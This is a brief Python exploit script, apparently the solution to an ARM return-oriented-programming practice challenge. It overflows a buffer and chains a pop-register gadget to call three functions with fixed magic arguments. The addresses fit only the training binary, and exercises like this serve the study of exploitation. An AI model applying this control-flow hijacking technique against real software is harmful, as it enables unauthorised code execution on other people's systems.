#!/usr/bin/python3

from ropchain import *

# Gadgets / Useful addresses

CALL_ME1            = 0x00010618
CALL_ME2            = 0x0001066c
CALL_ME3            = 0x0001060c
POP_R0_R1_R2_LR_PC  = 0x00010870

# ROP

rop = pad(36)

rop += pack4(POP_R0_R1_R2_LR_PC)
rop += pack4(0xdeadbeef) + pack4(0xcafebabe) + pack4(0xd00df00d)
rop += pack4(POP_R0_R1_R2_LR_PC)
rop += pack4(CALL_ME1)
rop += pack4(0xdeadbeef) + pack4(0xcafebabe) + pack4(0xd00df00d)
rop += pack4(POP_R0_R1_R2_LR_PC)
rop += pack4(CALL_ME2)
rop += pack4(0xdeadbeef) + pack4(0xcafebabe) + pack4(0xd00df00d)
rop += pack4(0)
rop += pack4(CALL_ME3)

echo(rop)
